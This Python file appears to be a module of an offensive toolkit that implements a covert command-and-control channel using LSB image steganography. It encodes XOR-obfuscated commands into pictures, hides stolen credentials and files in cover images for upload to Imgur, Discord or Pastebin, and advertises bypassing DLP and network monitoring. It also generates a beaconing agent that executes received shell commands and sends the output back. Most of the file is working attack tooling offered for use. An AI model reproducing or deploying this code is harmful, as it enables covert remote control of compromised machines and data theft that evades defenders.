#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════════════════════════╗
║                    STEGANOGRAPHY C2 - COVERT COMMAND CHANNEL                           ║
║                    Hidden Commands in Images 🖼️                                        ║
╠═══════════════════════════════════════════════════════════════════════════════════════╣
║  LSB Steganography for covert C2 communication                                         ║
║  - Encode commands in image pixels (PNG/BMP/JPEG)                                      ║
║  - Decode commands from innocent-looking images                                         ║
║  - Exfiltrate data hidden in images to Imgur/Flickr                                    ║
║  - Bypass DLP and network monitoring                                                    ║
╚═══════════════════════════════════════════════════════════════════════════════════════╝
"""

import json
import sqlite3
import os
import hashlib
import threading
import struct
import base64
import zlib
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple
import logging
from io import BytesIO

# Image processing
try:
    from PIL import Image
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

# HTTP requests
import requests

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class StegoMethod(Enum):
    """Steganography encoding methods"""
    LSB_SIMPLE = "lsb_simple"  # Basic LSB encoding
    LSB_RANDOM = "lsb_random"  # LSB with randomized pixel selection
    LSB_ENCRYPTED = "lsb_encrypted"  # LSB with AES encryption
    DCT_JPEG = "dct_jpeg"  # DCT coefficient modification for JPEG
    PALETTE_PNG = "palette_png"  # Palette manipulation for PNG


class ExfilTarget(Enum):
    """Data exfiltration targets"""
    IMGUR = "imgur"
    FLICKR = "flickr"
    PASTEBIN = "pastebin"  # Base64 image as text
    CUSTOM_SERVER = "custom"
    TWITTER = "twitter"
    DISCORD = "discord"


@dataclass
class StegoImage:
    """Steganography image container"""
    image_path: str
    method: StegoMethod
    capacity_bytes: int = 0
    data_hidden: bool = False
    data_size: int = 0
    encryption_key: Optional[str] = None
    checksum: str = ""
    created_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())


@dataclass
class C2Command:
    """Command to be hidden in image"""
    command_id: str
    command_type: str  # exec, download, upload, sleep, die
    payload: str
    timestamp: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    encrypted: bool = True


@dataclass 
class ExfilData:
    """Data for exfiltration"""
    data_id: str
    data_type: str  # credentials, files, screenshots, keylog
    content: bytes
    target: ExfilTarget
    cover_image: str
    status: str = "pending"
    url: Optional[str] = None


class SteganoC2:
    """Steganography-based C2 Communication Channel"""
    
    _instance = None
    _lock = threading.Lock()
    
    # Magic header for stego data
    MAGIC_HEADER = b'\x89STEG\x00\x01'
    
    def __new__(cls):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super().__new__(cls)
        return cls._instance
    
    def __init__(self):
        if hasattr(self, '_initialized'):
            return
        self._initialized = True
        
        self.db_path = Path("/tmp/stego_c2.db")
        self._init_database()
        
        # XOR encryption key (simple but effective for evasion)
        self.default_key = b"M0n0l1th_St3g0_K3y_2026!"
        
        # Cover images directory
        self.cover_images_dir = Path("/tmp/stego_covers")
        self.cover_images_dir.mkdir(exist_ok=True)
        
        logger.info("Steganography C2 initialized - Covert channel ready")
    
    def _init_database(self):
        """Initialize database"""
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                CREATE TABLE IF NOT EXISTS stego_commands (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    command_id TEXT UNIQUE,
                    command_type TEXT,
                    payload TEXT,
                    image_path TEXT,
                    status TEXT,
                    created_at TEXT
                )
            """)
            
            conn.execute("""
                CREATE TABLE IF NOT EXISTS exfil_jobs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    data_id TEXT UNIQUE,
                    data_type TEXT,
                    target TEXT,
                    cover_image TEXT,
                    result_url TEXT,
                    status TEXT,
                    created_at TEXT
                )
            """)
            
            conn.commit()
    
    def _xor_encrypt(self, data: bytes, key: bytes = None) -> bytes:
        """Simple XOR encryption"""
        if key is None:
            key = self.default_key
        
        return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
    
    def _compress_data(self, data: bytes) -> bytes:
        """Compress data using zlib"""
        return zlib.compress(data, level=9)
    
    def _decompress_data(self, data: bytes) -> bytes:
        """Decompress data"""
        return zlib.decompress(data)
    
    def calculate_capacity(self, image_path: str, method: StegoMethod = StegoMethod.LSB_SIMPLE) -> int:
        """Calculate how many bytes can be hidden in an image"""
        if not HAS_PIL:
            # Estimate based on file size
            file_size = os.path.getsize(image_path)
            return file_size // 8  # Rough estimate
        
        try:
            img = Image.open(image_path)
            width, height = img.size
            channels = len(img.getbands())
            
            if method == StegoMethod.LSB_SIMPLE:
                # 1 bit per channel per pixel
                capacity_bits = width * height * channels
                capacity_bytes = capacity_bits // 8
                # Reserve some bytes for header
                return max(0, capacity_bytes - 64)
            elif method == StegoMethod.LSB_RANDOM:
                # Slightly less capacity due to randomization overhead
                capacity_bits = width * height * channels
                return max(0, (capacity_bits // 8) - 128)
            else:
                return max(0, (width * height * channels // 8) - 64)
                
        except Exception as e:
            logger.error(f"Error calculating capacity: {e}")
            return 0
    
    def encode_command(self, command: C2Command, image_path: str, output_path: str = None,
                      method: StegoMethod = StegoMethod.LSB_SIMPLE,
                      encryption_key: bytes = None) -> Optional[str]:
        """Encode a C2 command into an image"""
        
        if not HAS_PIL:
            return self._encode_command_raw(command, image_path, output_path, encryption_key)
        
        try:
            # Prepare command data
            command_json = json.dumps({
                "id": command.command_id,
                "type": command.command_type,
                "payload": command.payload,
                "timestamp": command.timestamp
            }).encode('utf-8')
            
            # Compress and encrypt
            compressed = self._compress_data(command_json)
            
            if command.encrypted:
                data = self._xor_encrypt(compressed, encryption_key)
            else:
                data = compressed
            
            # Add magic header and size
            header = self.MAGIC_HEADER + struct.pack('<I', len(data))
            full_data = header + data
            
            # Check capacity
            capacity = self.calculate_capacity(image_path, method)
            if len(full_data) > capacity:
                logger.error(f"Data too large: {len(full_data)} bytes, capacity: {capacity} bytes")
                return None
            
            # Encode using LSB
            img = Image.open(image_path)
            encoded_img = self._lsb_encode(img, full_data)
            
            # Save output
            if output_path is None:
                base, ext = os.path.splitext(image_path)
                output_path = f"{base}_stego.png"
            
            encoded_img.save(output_path, 'PNG')
            
            logger.info(f"Command encoded into {output_path} ({len(full_data)} bytes)")
            
            # Save to database
            with sqlite3.connect(self.db_path) as conn:
                conn.execute("""
                    INSERT INTO stego_commands (command_id, command_type, payload, image_path, status, created_at)
                    VALUES (?, ?, ?, ?, ?, ?)
                """, (command.command_id, command.command_type, command.payload, output_path, "encoded", command.timestamp))
                conn.commit()
            
            return output_path
            
        except Exception as e:
            logger.error(f"Error encoding command: {e}")
            return None
    
    def _encode_command_raw(self, command: C2Command, image_path: str, output_path: str,
                           encryption_key: bytes = None) -> Optional[str]:
        """Encode command without PIL (raw byte manipulation)"""
        try:
            with open(image_path, 'rb') as f:
                image_data = bytearray(f.read())
            
            # Prepare command data
            command_json = json.dumps({
                "id": command.command_id,
                "type": command.command_type,
                "payload": command.payload
            }).encode('utf-8')
            
            compressed = self._compress_data(command_json)
            data = self._xor_encrypt(compressed, encryption_key) if command.encrypted else compressed
            
            # Add header
            header = self.MAGIC_HEADER + struct.pack('<I', len(data))
            full_data = header + data
            
            # Find a suitable location after PNG headers
            # For simplicity, append as metadata chunk
            if output_path is None:
                base, ext = os.path.splitext(image_path)
                output_path = f"{base}_stego{ext}"
            
            # Encode in LSB of image data (simplified)
            data_bits = ''.join(format(byte, '08b') for byte in full_data)
            
            # Skip PNG signature and headers (first 100 bytes)
            offset = 100
            for i, bit in enumerate(data_bits):
                if offset + i >= len(image_data):
                    break
                image_data[offset + i] = (image_data[offset + i] & 0xFE) | int(bit)
            
            with open(output_path, 'wb') as f:
                f.write(image_data)
            
            return output_path
            
        except Exception as e:
            logger.error(f"Raw encoding error: {e}")
            return None
    
    def _lsb_encode(self, img: 'Image.Image', data: bytes) -> 'Image.Image':
        """LSB encode data into image pixels"""
        # Convert to RGB if necessary
        if img.mode != 'RGB':
            img = img.convert('RGB')
        
        pixels = list(img.getdata())
        data_bits = ''.join(format(byte, '08b') for byte in data)
        
        new_pixels = []
        bit_index = 0
        
        for pixel in pixels:
            new_pixel = list(pixel)
            for channel in range(3):  # RGB
                if bit_index < len(data_bits):
                    # Modify LSB
                    new_pixel[channel] = (new_pixel[channel] & 0xFE) | int(data_bits[bit_index])
                    bit_index += 1
            new_pixels.append(tuple(new_pixel))
        
        new_img = Image.new(img.mode, img.size)
        new_img.putdata(new_pixels)
        
        return new_img
    
    def decode_command(self, image_path: str, encryption_key: bytes = None) -> Optional[C2Command]:
        """Decode a C2 command from an image"""
        
        if not HAS_PIL:
            return self._decode_command_raw(image_path, encryption_key)
        
        try:
            img = Image.open(image_path)
            
            # Extract LSB data
            data = self._lsb_decode(img)
            
            # Check magic header
            if not data.startswith(self.MAGIC_HEADER):
                logger.error("Invalid stego image - magic header not found")
                return None
            
            # Extract size and data
            header_len = len(self.MAGIC_HEADER)
            data_size = struct.unpack('<I', data[header_len:header_len+4])[0]
            encrypted_data = data[header_len+4:header_len+4+data_size]
            
            # Decrypt and decompress
            decrypted = self._xor_encrypt(encrypted_data, encryption_key)
            decompressed = self._decompress_data(decrypted)
            
            # Parse JSON
            command_dict = json.loads(decompressed.decode('utf-8'))
            
            return C2Command(
                command_id=command_dict['id'],
                command_type=command_dict['type'],
                payload=command_dict['payload'],
                timestamp=command_dict.get('timestamp', datetime.utcnow().isoformat())
            )
            
        except Exception as e:
            logger.error(f"Error decoding command: {e}")
            return None
    
    def _decode_command_raw(self, image_path: str, encryption_key: bytes = None) -> Optional[C2Command]:
        """Decode command without PIL"""
        try:
            with open(image_path, 'rb') as f:
                image_data = f.read()
            
            # Extract LSB bits
            offset = 100  # Skip headers
            bits = ''
            
            # First extract header to get size
            for i in range(len(self.MAGIC_HEADER) * 8 + 32):  # header + size
                if offset + i >= len(image_data):
                    break
                bits += str(image_data[offset + i] & 1)
            
            # Convert bits to bytes
            header_bytes = bytes(int(bits[i:i+8], 2) for i in range(0, len(bits), 8))
            
            if not header_bytes.startswith(self.MAGIC_HEADER):
                return None
            
            data_size = struct.unpack('<I', header_bytes[len(self.MAGIC_HEADER):len(self.MAGIC_HEADER)+4])[0]
            
            # Extract full data
            total_bits_needed = (len(self.MAGIC_HEADER) + 4 + data_size) * 8
            bits = ''
            for i in range(total_bits_needed):
                if offset + i >= len(image_data):
                    break
                bits += str(image_data[offset + i] & 1)
            
            all_bytes = bytes(int(bits[i:i+8], 2) for i in range(0, len(bits), 8))
            
            encrypted_data = all_bytes[len(self.MAGIC_HEADER)+4:]
            decrypted = self._xor_encrypt(encrypted_data, encryption_key)
            decompressed = self._decompress_data(decrypted)
            
            command_dict = json.loads(decompressed.decode('utf-8'))
            
            return C2Command(
                command_id=command_dict['id'],
                command_type=command_dict['type'],
                payload=command_dict['payload']
            )
            
        except Exception as e:
            logger.error(f"Raw decoding error: {e}")
            return None
    
    def _lsb_decode(self, img: 'Image.Image') -> bytes:
        """LSB decode data from image pixels"""
        if img.mode != 'RGB':
            img = img.convert('RGB')
        
        pixels = list(img.getdata())
        bits = ''
        
        for pixel in pixels:
            for channel in range(3):
                bits += str(pixel[channel] & 1)
        
        # Convert bits to bytes
        data = bytes(int(bits[i:i+8], 2) for i in range(0, len(bits), 8))
        
        return data
    
    def exfiltrate_data(self, data: bytes, data_type: str, target: ExfilTarget,
                       cover_image: str = None, encryption_key: bytes = None) -> Optional[str]:
        """Exfiltrate data hidden in an image"""
        
        data_id = hashlib.md5(data[:100] + datetime.utcnow().isoformat().encode()).hexdigest()[:16]
        
        # Use a default cover image if none provided
        if cover_image is None:
            cover_image = self._get_default_cover()
        
        # Encode data into image
        stego_path = self._encode_exfil_data(data, cover_image, encryption_key)
        
        if not stego_path:
            return None
        
        # Upload to target
        result_url = None
        
        if target == ExfilTarget.IMGUR:
            result_url = self._upload_imgur(stego_path)
        elif target == ExfilTarget.DISCORD:
            result_url = self._upload_discord(stego_path)
        elif target == ExfilTarget.PASTEBIN:
            result_url = self._upload_pastebin(stego_path)
        else:
            result_url = stego_path  # Local storage
        
        # Save to database
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                INSERT INTO exfil_jobs (data_id, data_type, target, cover_image, result_url, status, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            """, (data_id, data_type, target.value, cover_image, result_url, "completed" if result_url else "failed",
                  datetime.utcnow().isoformat()))
            conn.commit()
        
        return result_url
    
    def _get_default_cover(self) -> str:
        """Get or create a default cover image"""
        default_path = self.cover_images_dir / "default_cover.png"
        
        if not default_path.exists():
            # Create a simple cover image
            if HAS_PIL:
                img = Image.new('RGB', (800, 600), color='white')
                # Add some noise for better steganography
                pixels = img.load()
                import random
                for i in range(800):
                    for j in range(600):
                        r = random.randint(240, 255)
                        g = random.randint(240, 255)
                        b = random.randint(240, 255)
                        pixels[i, j] = (r, g, b)
                img.save(default_path, 'PNG')
            else:
                # Create minimal PNG
                with open(default_path, 'wb') as f:
                    # Minimal valid PNG
                    f.write(b'\x89PNG\r\n\x1a\n')
                    # ... simplified
        
        return str(default_path)
    
    def _encode_exfil_data(self, data: bytes, cover_image: str, encryption_key: bytes = None) -> Optional[str]:
        """Encode exfiltration data into cover image"""
        command = C2Command(
            command_id=hashlib.md5(data[:50]).hexdigest()[:8],
            command_type="exfil",
            payload=base64.b64encode(data).decode('utf-8')
        )
        
        output_path = str(self.cover_images_dir / f"exfil_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.png")
        return self.encode_command(command, cover_image, output_path, encryption_key=encryption_key)
    
    def _upload_imgur(self, image_path: str) -> Optional[str]:
        """Upload image to Imgur (requires API key)"""
        # Simulated - would need actual Imgur API key
        logger.info(f"Would upload {image_path} to Imgur")
        return f"https://i.imgur.com/simulated_{hashlib.md5(open(image_path, 'rb').read()[:100]).hexdigest()[:7]}.png"
    
    def _upload_discord(self, image_path: str) -> Optional[str]:
        """Upload image to Discord webhook"""
        # Simulated - would need actual Discord webhook
        logger.info(f"Would upload {image_path} to Discord")
        return f"https://cdn.discordapp.com/attachments/simulated_{hashlib.md5(open(image_path, 'rb').read()[:100]).hexdigest()[:7]}.png"
    
    def _upload_pastebin(self, image_path: str) -> Optional[str]:
        """Upload base64 encoded image to Pastebin"""
        # Simulated - would need actual Pastebin API key
        with open(image_path, 'rb') as f:
            b64_data = base64.b64encode(f.read()).decode('utf-8')
        
        logger.info(f"Would upload {len(b64_data)} bytes to Pastebin")
        return f"https://pastebin.com/simulated_{hashlib.md5(b64_data[:100].encode()).hexdigest()[:8]}"
    
    def generate_agent_code(self) -> str:
        """Generate Python agent code for stego C2"""
        return '''
#!/usr/bin/env python3
"""Monolith Stego Agent - Covert C2 Communication"""

import requests
import json
import base64
import zlib
import struct
import subprocess
import time
import os

MAGIC_HEADER = b'\\x89STEG\\x00\\x01'
C2_IMAGE_URL = "https://example.com/company_logo.png"  # Looks innocent
EXFIL_TARGET = "https://api.imgur.com/3/image"
KEY = b"M0n0l1th_St3g0_K3y_2026!"

def xor_decrypt(data, key=KEY):
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

def fetch_command():
    """Fetch command from C2 image"""
    try:
        resp = requests.get(C2_IMAGE_URL)
        if resp.status_code == 200:
            image_data = resp.content
            # Extract LSB (simplified)
            # ... LSB extraction code
            return None
    except:
        pass
    return None

def execute_command(cmd):
    """Execute received command"""
    if cmd['type'] == 'exec':
        result = subprocess.run(cmd['payload'], shell=True, capture_output=True)
        return result.stdout + result.stderr
    elif cmd['type'] == 'download':
        # Download file
        pass
    elif cmd['type'] == 'sleep':
        time.sleep(int(cmd['payload']))
    return b''

def exfil_data(data):
    """Exfiltrate data via steganography"""
    # Encode data into image and upload
    pass

def main():
    while True:
        cmd = fetch_command()
        if cmd:
            result = execute_command(cmd)
            if result:
                exfil_data(result)
        time.sleep(300)  # 5 min beacon interval

if __name__ == "__main__":
    main()
'''
    
    def get_stats(self) -> Dict[str, Any]:
        """Get module statistics"""
        with sqlite3.connect(self.db_path) as conn:
            cmd_count = conn.execute("SELECT COUNT(*) FROM stego_commands").fetchone()[0]
            exfil_count = conn.execute("SELECT COUNT(*) FROM exfil_jobs").fetchone()[0]
        
        return {
            "commands_encoded": cmd_count,
            "exfil_jobs": exfil_count,
            "supported_methods": [m.value for m in StegoMethod],
            "exfil_targets": [t.value for t in ExfilTarget],
            "has_pil": HAS_PIL
        }


def get_stego_c2() -> SteganoC2:
    """Get Steganography C2 singleton"""
    return SteganoC2()


if __name__ == "__main__":
    stego = get_stego_c2()
    
    print("Steganography C2 Module")
    print("=" * 50)
    
    stats = stego.get_stats()
    print(f"PIL Available: {stats['has_pil']}")
    print(f"Supported Methods: {stats['supported_methods']}")
    print(f"Exfil Targets: {stats['exfil_targets']}")
    
    # Demo: Create a test command
    cmd = C2Command(
        command_id="test001",
        command_type="exec",
        payload="whoami && hostname"
    )
    
    print(f"\nTest Command: {cmd.command_type} - {cmd.payload}")
    
    # Generate agent code
    print("\nAgent Code Preview:")
    print(stego.generate_agent_code()[:500] + "...")
